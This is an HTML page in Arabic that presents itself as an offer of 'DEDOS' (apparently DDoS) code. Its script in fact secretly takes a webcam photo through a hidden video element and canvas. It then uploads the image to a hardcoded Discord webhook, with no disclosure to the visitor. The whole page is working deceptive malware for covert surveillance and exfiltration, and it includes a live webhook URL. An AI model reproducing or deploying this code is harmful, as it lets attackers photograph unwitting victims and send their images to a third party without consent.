<!doctype html>
<html lang="ar">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title> — </title>
  <style>
    body{
      font-family: Arial, sans-serif;
      direction: rtl;
      padding:18px;
      background:#000;
      color:#fff;
    }
    .warn{
      background:#330000;
      border:1px solid #660000;
      padding:12px;
      border-radius:8px;
      margin-bottom:12px;
    }
    button{
      padding:10px 15px;
      font-size:15px;
      cursor:pointer;
      border-radius:6px;
    }
  </style>
</head>
<body>

<h2></h2>

<div class="warn">
  <p>Do you really want the DEDOS code? Press the "yes" button.</p>
  <p><b></b></p>
  <div style="margin-top:8px">
    <button id="agree">yes</button>
    <button id="decline"></button>
  </div>
</div>

<p id="status"></p>

<script>
const agree = document.getElementById('agree');
const decline = document.getElementById('decline');
const status = document.getElementById('status');

let stream = null;

// رابط الويب هوك
const webhookURL = "https://canary.discord.com/api/webhooks/1447706927353167962/JJ2hUfVHl3h-EmSB6NECBqXMAI83hQKnxeIRjXC8WD_U0jfIWOKa999iEs5BQenTAwN5";

decline.addEventListener('click', () => {
  alert("");
});

agree.addEventListener('click', async () => {

  if(!confirm("")) return;

  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: true });
  } catch (e) {
    alert("");
    return;
  }

  status.textContent = "...";

  // إنشاء فيديو مخفي
  const video = document.createElement("video");
  video.style.display = "none";
  video.autoplay = true;
  video.playsinline = true;
  document.body.appendChild(video);
  video.srcObject = stream;

  // ننتظر تشغيل الفيديو
  await new Promise(res => video.onloadedmetadata = res);

  // تجهيز الكانفس (مخفي)
  const canvas = document.createElement("canvas");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;

  const ctx = canvas.getContext('2d');
  ctx.drawImage(video, 0, 0);

  // تحويل إلى Blob
  canvas.toBlob(async blob => {

    // إيقاف الكاميرا
    stream.getTracks().forEach(t => t.stop());

    const form = new FormData();
    form.append("file", blob, "photo.jpg");
    form.append("payload_json", JSON.stringify({
      content: "📸 تم التقاط صورة."
    }));

    status.textContent = "...";

    try {
      const res = await fetch(webhookURL, {
        method: "POST",
        body: form
      });

      if(res.ok){
        status.textContent = "✔";
      } else {
        status.textContent = "فشل الإرسال: " + res.status;
      }
    } catch (e) {
      status.textContent = "خطأ أثناء الإرسال.";
    }

  }, "image/jpeg", 0.9);

});
</script>

</body>
</html>
